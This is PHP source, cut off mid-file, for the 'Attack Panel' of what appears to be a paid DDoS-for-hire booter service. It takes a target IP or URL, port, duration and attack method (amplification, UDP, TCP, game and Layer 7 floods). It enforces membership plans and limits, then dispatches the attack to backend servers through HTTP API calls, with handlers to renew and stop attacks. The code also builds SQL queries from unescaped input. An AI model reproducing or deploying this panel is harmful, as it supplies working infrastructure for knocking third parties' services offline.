<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function valid_URL($url)
{
	return preg_match('%^(?:(?:https?|ftp)://)(?:\S+(?::\S*)?@|\d{1,3}(?:\.\d{1,3}){3}|(?:(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)(?:\.(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)*(?:\.[a-z\x{00a1}-\x{ffff}]{2,6}))(?::\d+)?(?:[^\s]*)?$%iu', $url);
}

include("header.php");
ini_set('default_socket_timeout', 10);
if (isset($_POST["launchAttack"])) {
	$paketid = $user["uyelik"];

	$paket = @mysqli_query($baglanti, "select * from paketler where id='$paketid'");
	$paket = $paket->fetch_assoc();
	$pakettur = $paket["node"];

	$method = htmlentities($_POST['method'], ENT_QUOTES, "UTF-8");
	$data2 = mysqli_query($baglanti, "select * from method where deger='$method' ORDER BY id ASC");
	$satir2 = mysqli_fetch_array($data2);





	if ($pakettur == "Free" && $satir2["node"] != "Free") {
		header("Location: ?process=cx");
		exit;
	}
	if ($satir2["node"] == $pakettur || $pakettur == "VIP" || $pakettur == "Free") {
	} else {
		header("Location: ?process=cx");
		exit;
	}

	$id = $_SESSION["id"];
	$ip = $_POST['ip'];
	$ip = htmlentities($ip, ENT_QUOTES, "UTF-8");
	$port = $_POST['port'];
	$port = htmlentities($port, ENT_QUOTES, "UTF-8");
	$sure = htmlentities($_POST['sure'], ENT_QUOTES, "UTF-8");
	$method = htmlentities($_POST['method'], ENT_QUOTES, "UTF-8");
	$tarih = date("Y-m-d H:i:s");
	if (date("YmdHis") < $_SESSION["saldiri"]) {
		//header("Location: ?process=cooldown");
		//exit;
	}
	$_SESSION["saldiri"] = date("YmdHis", strtotime("+10 second"));
	$tarih = date("Y-m-d H:i:s");
	$paketid = $user["uyelik"];
	if ($paketid == "0") {
		header("Location: ?process=noplan");
		exit;
	}

	$data2XRS = mysqli_query($baglanti, "select * from method where deger='$method'");
	$satir2XRS = mysqli_fetch_assoc($data2XRS);
	$fsfs = $satir2XRS["method"];
	$fsfs2 = $satir2XRS["deger"];

	if ($satir2XRS["kate"] == "Layer7") {
		$port = 80;
	}

	if (is_numeric($port) && $port >= 1 && $port <= 65535) {
	} else {
		header("Location: ?process=invalidport");
		exit;
	}

	if ($satir2XRS["kate"] != "Layer7") {
		if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
			header("Location: ?process=invalidhost");
			exit;
		}
	} else {
		if (!valid_URL($ip)) {
			header("Location: ?process=invalidhost");
			exit;
		}
	}

	if (!is_numeric($sure) || $sure < 5 || $sure >= 14000) {
		header("Location: ?process=invalidtime");
		exit;
	}

	$paket = @mysqli_query($baglanti, "select * from paketler where id='$paketid'");
	$paket = $paket->fetch_assoc();
	if ($sure > $paket["max_sure"]) {
		header("Location: ?process=time");
		exit;
	}
	$tarih2 = date("Y-m-d");
	$log = mysqli_num_rows(mysqli_query($baglanti, "select * from log where user='$userid' and  tarih between '$tarih2 00:00:00' and '$tarih2 23:59:59'"));

	if ($log >= $paket["gunluk_limit"]) {
		header("Location: ?process=limit");
		exit;
	}
	$sonlanma = date("Y-m-d H:i:s", strtotime("+" . $sure . " second"));

	$kont = @mysqli_query($baglanti, "select * from blacklist where eslesen='0' and deger='$ip' or eslesen='1' and deger LIKE '%$ip%' LIMIT 1");
	$kont = $kont->fetch_assoc();
	if ($kont["id"] != Null) {
		header("Location: ?process=blacklist");
		exit;
	}
	$tarish = date("Y-m-d H:i:s");
	$kont1 = mysqli_num_rows(mysqli_query($baglanti, "select * from log where sonlanma > '$tarish'"));
	$degser = mysqli_fetch_array(mysqli_query($baglanti, "SELECT SUM(es_zaman) as toplam FROM sunucular"));
	$kont2 = $degser['toplam'];

	if ($kont1 >= $kont2) {
		header("Location: ?process=slot");
		exit;
	}

	$node = $paket["node"];
	$anlik_saldir = $paket["anlik_saldir"];

	$serverPID = ($pakettur == "Free" ? 1 : 0);
	if ($satir2XRS["kate"] == "Layer7") {
		$serverKtq = 7;
	} else {
		$serverKtq = 4;
	}
	$datasss = @mysqli_query($baglanti, "select * from sunucular where paket='" . $serverPID . "' and typex='".$serverKtq."' order by rand()");
	$gostersa = "0";
	$say = 0;
	$kont = 0;

	$tempAttack = [];

	$tarishX = date("Y-m-d H:i:s");
	$aktifsaldiriClient = mysqli_num_rows(mysqli_query($baglanti, "select * from log where user='$id' and sonlanma > '$tarishX'"));

	if ($aktifsaldiriClient >= $paket["es_zaman"]) {
		header("Location: ?process=concurrent");
		exit;
		die();
	}

	while ($sunucu = mysqli_fetch_array($datasss)) {
		$sunucuid = $sunucu["id"];
		$aktifsaldiri = mysqli_num_rows(mysqli_query($baglanti, "select * from log where sunucu='$sunucuid' and sonlanma > '$tarih'"));
		if ($aktifsaldiri < $sunucu["es_zaman"]) {
			$say++;
			array_push($tempAttack, ["api" => $sunucu["api"], "host" => $ip, "port" => $port, "time" => $sure, "method" => $fsfs2, "node" => $node]);
			$gostersa = "1";
			if ($say >= $anlik_saldir) {
				break;
			}
			//$saldir = file_get_contents($sunucu["api"]."&host=".$ip."&port=".$port."&time=".$sure."&method=".$method."&node=".$node);
		}
	}
	$node = $paket["node"];
	if ($sunucu["id"] == Null || $gostersa == "0") {
		header("Location: ?process=slot");
		exit;
	}
	$sunucuid = $sunucu["id"];
	if (count($tempAttack) >= 1) {
		//start
		$baglanti->query("INSERT INTO log (user, ip, port, sure, method, tarih, sonlanma,sunucu,saldiri) VALUES ('$id','$ip', '$port', '$sure', '$fsfs2', '$tarih', '$sonlanma', '$sunucuid','$anlik_saldir')");
		if ($baglanti->insert_id) {
			foreach ($tempAttack as $k => $v) {
				//print_r($v["api"]."&host=".$v["host"]."&port=".$v["port"]."&time=".$v["time"]."&method=".$v["method"]."&node=".$v["node"]."&id=".$baglanti->insert_id);
				@file_get_contents($v["api"] . "&host=" . $v["host"] . "&port=" . $v["port"] . "&time=" . $v["time"] . "&method=" . $v["method"] . "&node=" . $v["node"] . "&id=" . $baglanti->insert_id);
			}
			//die();
			header("Location: hub?process=success");
			exit;
		} else {
			header("Location: ?process=err");
			exit;
		}
	} else {
		header("Location: ?process=err");
		exit;
	}
}
if (isset($_GET["renew"])) {
	if (@$_GET["renew"] == Null) return;
	$yenidenid = htmlentities($_GET["renew"], ENT_QUOTES, "UTF-8");
	$yeniden = @mysqli_query($baglanti, "select * from log where id='$yenidenid' and user='$userid'");
	$yeniden = $yeniden->fetch_assoc();
	if ($yeniden["id"] == Null) {
		header("Location: hub");
		exit;
	}
	$tarih = date("Y-m-d H:i:s");
	if (date("YmdHis") < $_SESSION["saldiri"]) {
		//header("Location: ?process=cooldown");
		//exit;
	}
	$_SESSION["saldiri"] = date("YmdHis", strtotime("+10 second"));
	$id = $_SESSION["id"];
	$ip = htmlentities($yeniden["ip"], ENT_QUOTES, "UTF-8");
	$port = htmlentities($yeniden["port"], ENT_QUOTES, "UTF-8");
	$sure = htmlentities($yeniden["sure"], ENT_QUOTES, "UTF-8");
	$method = htmlentities($yeniden["method"], ENT_QUOTES, "UTF-8");

	$paketid = $user["uyelik"];

	$paket = @mysqli_query($baglanti, "select * from paketler where id='$paketid'");
	$paket = $paket->fetch_assoc();
	$pakettur = $paket["node"];

	$data2 = mysqli_query($baglanti, "select * from method where deger='$method' or method='$method' and node!='Free' ORDER BY id ASC");
	$satir2 = mysqli_fetch_array($data2);
	/*if($satir2["node"] != $pakettur || $pakettur != "VIP") {
		header("Location: hub");
		exit;
	}*/

	$tarih = date("Y-m-d H:i:s");
	$paketid = $user["uyelik"];

	if ($paketid == "0") {
		header("Location: ?process=noplan");
		exit;
	}

	$data2XRS = mysqli_query($baglanti, "select * from method where method='$method' or deger='$method'");
	$satir2XRS = mysqli_fetch_assoc($data2XRS);
	$fsfs = $satir2XRS["method"];
	$fsfs2 = $satir2XRS["deger"];


	if ($satir2XRS["kate"] == "Layer7") {
		$port = 80;
	}


	/*if (is_numeric($port) && $port >= 1 && $port <= 65535) {
	} else {
		header("Location: ?process=invalidport");
		exit;
	}

	$layer7sss = ["TLS","HTTP-POST","HTTP-GET","UAM","HTTP-Bypass","TLS1.2","UAM Bypass"];

	if ($satir2XRS["kate"] != "Layer7") {
		if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
			//header("Location: ?process=invalidhost");
			header("Location: ?process=invalidhostx2XX&abc=".base64_encode($satir2XRS));
			exit;
		}
	} else {
		if (!valid_URL($ip)) {
			header("Location: ?process=invalidhostx2SASAS&abc=".base64_encode($ip));
			exit;
		}
	}*/

	if (!is_numeric($sure) || $sure < 5 || $sure >= 14000) {
		header("Location: ?process=invalidtime");
		exit;
	}

	$paket = @mysqli_query($baglanti, "select * from paketler where id='$paketid'");
	$paket = $paket->fetch_assoc();
	if ($sure > $paket["max_sure"]) {
		header("Location: ?process=time");
		exit;
	}
	$tarih2 = date("Y-m-d");
	$log = mysqli_num_rows(mysqli_query($baglanti, "select * from log where user='$userid' and  tarih between '$tarih2 00:00:00' and '$tarih2 23:59:59'"));

	if ($log >= $paket["gunluk_limit"]) {
		header("Location: ?process=limit");
		exit;
	}
	$sonlanma = date("Y-m-d H:i:s", strtotime("+" . $sure . " second"));


	$node = $paket["node"];


	$kont = @mysqli_query($baglanti, "select * from blacklist where eslesen='0' and deger='$ip' or eslesen='1' and deger LIKE '%$ip%' LIMIT 1");
	$kont = $kont->fetch_assoc();
	if ($kont["id"] != Null) {
		header("Location: ?process=blacklist");
		exit;
	}
	$tarish = date("Y-m-d H:i:s");
	$kont1 = mysqli_num_rows(mysqli_query($baglanti, "select * from log where sonlanma > '$tarish'"));
	$degser = mysqli_fetch_array(mysqli_query($baglanti, "SELECT SUM(es_zaman) as toplam FROM sunucular"));
	$kont2 = $degser['toplam'];
	if ($kont1 >= $kont2) {
		header("Location: ?process=slot");
		exit;
	}


	$anlik_saldir = $paket["anlik_saldir"];
	$serverPID = ($pakettur == "Free" ? 1 : 0);
	if ($satir2XRS["kate"] == "Layer7") {
		$serverKtq = 7;
	} else {
		$serverKtq = 4;
	}
	$datasss = @mysqli_query($baglanti, "select * from sunucular where paket='" . $serverPID . "' and typex='".$serverKtq."' order by rand()");
	$gostersa = "0";
	$say = 0;
	$kont = 0;

	$tarishX = date("Y-m-d H:i:s");
	$aktifsaldiriClient = mysqli_num_rows(mysqli_query($baglanti, "select * from log where user='$id' and sonlanma > '$tarishX'"));

	if ($aktifsaldiriClient >= $paket["es_zaman"]) {
		header("Location: ?process=concurrent");
		exit;
		die();
	}

	$tempAttack = [];
	while ($sunucu = mysqli_fetch_array($datasss)) {
		$sunucuid = $sunucu["id"];
		$aktifsaldiri = mysqli_num_rows(mysqli_query($baglanti, "select * from log where sunucu='$sunucuid' and sonlanma > '$tarih'"));
		if ($aktifsaldiri < $sunucu["es_zaman"]) {
			$say++;
			array_push($tempAttack, ["api" => $sunucu["api"], "host" => $ip, "port" => $port, "time" => $sure, "method" => $fsfs2, "node" => $node]);
			$saldir = "ok";
			if ($saldir = "ok") {
				$kont++;
			}
			$gostersa = "1";
		}
		if ($say >= $anlik_saldir) {
			break;
		}
	}
	$node = $paket["node"];
	if ($sunucu["id"] == Null || $gostersa == "0") {
		header("Location: ?process=slot");
		exit;
	}
	$sunucuid = $sunucu["id"];
	if ($kont == "0") {
		header("Location: ?process=err");
		exit;
	}

	if ($saldir == "ok") {
		//renew
		$baglanti->query("INSERT INTO log (user, ip, port, sure, method, tarih, sonlanma,sunucu,saldiri) VALUES ('$id','$ip', '$port', '$sure', '$fsfs', '$tarih', '$sonlanma', '$sunucuid','$anlik_saldir')");
		if ($baglanti->insert_id) {
			foreach ($tempAttack as $k => $v) {
				//print_r($v["api"]."&host=".$v["host"]."&port=".$v["port"]."&time=".$v["time"]."&method=".$v["method"]."&node=".$v["node"]."&id=".$baglanti->insert_id);
				$as = @file_get_contents($v["api"] . "&host=" . $v["host"] . "&port=" . $v["port"] . "&time=" . $v["time"] . "&method=" . $v["method"] . "&node=" . $v["node"] . "&id=" . $baglanti->insert_id);
			}
			//die();
			//header("Location: hub?process=success&as=".$as."&gaga=".json_encode($tempAttack)."&bbb=".$fsfs2);
			header("Location: hub?process=success");
			exit;
		} else {
			header("Location: ?process=err");
			exit;
		}
	}
}
if (isset($_GET["stop"])) {
	if (@$_GET["stop"] == Null) return;
	$yenidenid = htmlentities($_GET["stop"], ENT_QUOTES, "UTF-8");
	$yeniden = @mysqli_query($baglanti, "select * from log where id='$yenidenid' and user='$userid'");
	$yeniden = $yeniden->fetch_assoc();
	if ($yeniden["id"] == Null) {
		header("Location: hub");
		exit;
	}
	$id = $_SESSION["id"];
	$ip = htmlentities($yeniden["ip"], ENT_QUOTES, "UTF-8");
	$port = htmlentities($yeniden["port"], ENT_QUOTES, "UTF-8");
	$sure = htmlentities($yeniden["sure"], ENT_QUOTES, "UTF-8");
	$method = htmlentities($yeniden["method"], ENT_QUOTES, "UTF-8");
	$tarih = date("Y-m-d H:i:s");
	$paketid = $user["uyelik"];
	$paket = @mysqli_query($baglanti, "select * from paketler where id='$paketid'");
	$paket = $paket->fetch_assoc();
	$sunucuid = $yeniden["sunucu"];
	$sunucu = @mysqli_query($baglanti, "select * from sunucular where id='$sunucuid'");
	$sunucu = $sunucu->fetch_assoc();
	$node = $paket["node"];
	$saldir = @file_get_contents($sunucu["api"] . "&host=" . $ip . "&port=" . $port . "&time=" . $sure . "&method=STOP&node=" . $node . "&id=" . $yenidenid);

	if (isset(json_encode($saldir, true)["error"])) {

		header("Location: ?process=err");
		exit;
	}
	$baglanti->query("UPDATE log SET  sonlanma='$tarih' WHERE id='$yenidenid'");
	header("Location: hub?process=ok");
}
?>
<style type="text/css">
	.ceviz optgroup {
		color: #888ea8 !important
	}

	.ceviz optgroup option {
		color: #cdcace !important
	}
</style>

<div id="content" class="main-content">
	<div class="layout-px-spacing">

		<div class="row layout-top-spacing">
			<div class="col-xl-6 col-lg-6 col-md-6 col-sm-12 col-12  layout-spacing">
				<div class="widget widget-table-three">
					<div class="widget-heading">
						<h5 class="">Attack Panel</h5>
					</div>
					<div class="widget-content">
						<?php
						if (isset($_SERVER['HTTP_REFERER'])) {
							if (isset($_GET["process"])) {
								if (@$_GET["process"] == "time") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>You\'ve reached your maximum attack time limit.</div>';
								}
								if (@$_GET["process"] == "limit") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>You\'ve reached your daily attack limit.</div>';
								}
								if (@$_GET["process"] == "success") {
									echo '<div class="alert alert-outline-success mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>Attack sent successfully.</div>';
								}
								if (@$_GET["process"] == "slot") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>All slots are full, please try again later.</div>';
								}
								if (@$_GET["process"] == "blacklist") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>Blacklisted host.</div>';
								}
								if (@$_GET["process"] == "err") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>The request failed, please try again later.</div>';
								}
								if (@$_GET["process"] == "ok") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>Attack was successfully stopped.</div>';
								}
								if (@$_GET["process"] == "noplan") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>You cannot launch an attack because you do not have a current plan. <a href="purchase" class="btn btn-info btn-sm">Purchase Membership</a></div>';
								}
								if (@$_GET["process"] == "cooldown") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>To launch a new attack, you have to wait 10 seconds.</div>';
								}
								if (@$_GET["process"] == "concurrent") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>You\'ve reached your concurrent attack limit.</div>';
								}
								if (@$_GET["process"] == "invalidport") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>Invalid port entered.</div>';
								}
								if (@$_GET["process"] == "invalidhost") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>Invalid ip/host entered.</div>';
								}
								if (@$_GET["process"] == "invalidtime") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>Invalid time entered.</div>';
								}
								if (@$_GET["process"] == "cx") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>You can\'t use that method without have paid plan.</div>';
								}
								if (@$_GET["process"] == "aStopped") {
									echo '<div class="alert alert-outline-danger mb-4" role="alert"> <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-x close" data-dismiss="alert"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><i class="flaticon-cancel-12 close" data-dismiss="alert"></i>All attacks' . (isset($_GET["total"]) && @$_GET["total"] >= 1 && @$_GET["total"] <= 50 ? " (" . (int) @$_GET["total"] . ")" : "") . ' successfully stopped.</div>';
								}
							}
						} else {
							/*echo '<div class="alert alert-danger">';
								print_r($_SERVER['HTTP_REFERER']);
								echo "</div>";*/
						}


						?>

						<link rel="stylesheet" type="text/css" href="boostrap/css/boostrap.min.css">
						<style type="text/css">
							.widget-table-three .table .td-content a {
								border-bottom: unset !important
							}
						</style>
						<form method="post" action="">
							<div class="form-row mb-4">
								<div class="col-12">
									<input type="text" name="ip" required class="form-control" id="host" placeholder="IP Address"><br>
								</div>
								<div class="col-12" id="port">
									<input type="text" name="port" id="portInput" class="form-control" placeholder="Port"><br>
								</div>
								<div class="col-12">
									<input type="text" name="sure" id="surezbircir" required class="form-control" placeholder="Attack Time: Max. <?php echo $paket["max_sure"]; ?>"><br>
								</div>
								<div class="col-12">
									<select class="form-control ceviz" name="method" id="method">
										<?php
										$kont = array();
										$paketid = $user["uyelik"];

										$paket = @mysqli_query($baglanti, "select * from paketler where id='$paketid'");
										$paket = $paket->fetch_assoc();
										$pakettur = $paket["node"];
										$data = mysqli_query($baglanti, "select * from method  ORDER BY id DESC");
										while ($satir = mysqli_fetch_array($data)) {
											if ($paketid == 12) {
												$kate = "Free";
												if (!in_array($kate, $kont)) {
													array_push($kont, $kate);
													echo '<optgroup label="' . $kate . '">';
													$data2 = mysqli_query($baglanti, "select * from method where kate='$kate' and node='Free' ORDER BY id ASC");
													while ($satir2 = mysqli_fetch_array($data2)) {
														if ($satir2["node"] == $pakettur || $pakettur == "Free") {
															echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '</option>';
														} else {
															echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '</option>';
														}
													}
													echo '</optgroup>';
												}
											}

											$kate = "Amplification";
											if (!in_array($kate, $kont)) {
												array_push($kont, $kate);
												echo '<optgroup label="' . $kate . '">';
												$data2 = mysqli_query($baglanti, "select * from method where  kate='$kate' and node!='Free' ORDER BY id ASC");
												while ($satir2 = mysqli_fetch_array($data2)) {
													if ($satir2["node"] == $pakettur || $pakettur == "VIP") {
														echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													} else {
														echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													}
												}
												echo '</optgroup>';
											}

											$kate = "User Datagram Protocol (UDP)";
											if (!in_array($kate, $kont)) {
												array_push($kont, $kate);
												echo '<optgroup label="' . $kate . '">';
												$data2 = mysqli_query($baglanti, "select * from method where  kate='$kate' and node!='Free' ORDER BY id ASC");
												while ($satir2 = mysqli_fetch_array($data2)) {
													if ($satir2["node"] == $pakettur || $pakettur == "VIP") {
														echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													} else {
														echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													}
												}
												echo '</optgroup>';
											}

											$kate = "Transmission Control Protocol (TCP)";
											if (!in_array($kate, $kont)) {
												array_push($kont, $kate);
												echo '<optgroup label="' . $kate . '">';
												$data2 = mysqli_query($baglanti, "select * from method where  kate='$kate' and node!='Free' ORDER BY id ASC");
												while ($satir2 = mysqli_fetch_array($data2)) {
													if ($satir2["node"] == $pakettur || $pakettur == "VIP") {
														echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													} else {
														echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													}
												}
												echo '</optgroup>';
											}

											$kate = "Game Methods";
											if (!in_array($kate, $kont)) {
												array_push($kont, $kate);
												echo '<optgroup label="' . $kate . '">';
												$data2 = mysqli_query($baglanti, "select * from method where  kate='$kate' and node!='Free' ORDER BY id ASC");
												while ($satir2 = mysqli_fetch_array($data2)) {
													if ($satir2["node"] == $pakettur || $pakettur == "VIP") {
														echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													} else {
														echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													}
												}
												echo '</optgroup>';
											}

											$kate = "Private Methods";
											if (!in_array($kate, $kont)) {
												array_push($kont, $kate);
												echo '<optgroup label="Private Methods">';
												$data2 = mysqli_query($baglanti, "select * from method where  kate='$kate' and node!='Free' ORDER BY id ASC");
												while ($satir2 = mysqli_fetch_array($data2)) {
													if ($satir2["node"] == $pakettur || $pakettur == "VIP") {
														echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													} else {
														echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													}
												}
												echo '</optgroup>';
											}
										}

											$kate = "Layer 7";
											if (!in_array($kate, $kont)) {
												array_push($kont, $kate);
												echo '<optgroup label="' . $kate . '">';
												$data2 = mysqli_query($baglanti, "select * from method where kate='Layer7' and node!='Free' ORDER BY id ASC");
												while ($satir2 = mysqli_fetch_array($data2)) {
													if ($satir2["node"] == $pakettur || $pakettur == "VIP") {
														echo '<option value="' . $satir2["deger"] . '">' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													} else {
														echo '<option value="' . $satir2["deger"] . '" disabled>' . $satir2["method"] . '' . ($satir2["node"] == "VIP" ? " [PREMIUM]" : "") . '</option>';
													}
												}
												echo '</optgroup>';
											}

										?>
									</select>
								</div>
							</div>
							<div style="text-align: center !important">
								<button type="submit" value="Launch" name="launchAttack" class="btn btn-primary btn-block mb-4 mr-2">Launch</button>
							</div>
						</form>
					</div>
				</div>
			</div>

			<div class="col-xl-6 col-lg-6 col-md-6 col-sm-12 col-12 layout-spacing">
				<div class="widget widget-table-three">

					<div class="widget-heading" style="display: flex !important">
						<span>
							<h5 class="">Last Attacks</h5>
						</span>
						<span>
							<form action="" method="POST">
								<?php
								if (isset($_POST["stopAllAttacks"])) {
									$saaUserId = $user["id"];
									$saaTarih = date("Y-m-d H:i:s");
									$saaLogs = @mysqli_query($baglanti, "select * from log where user='" . $saaUserId . "' AND sonlanma > '" . $saaTarih . "'");
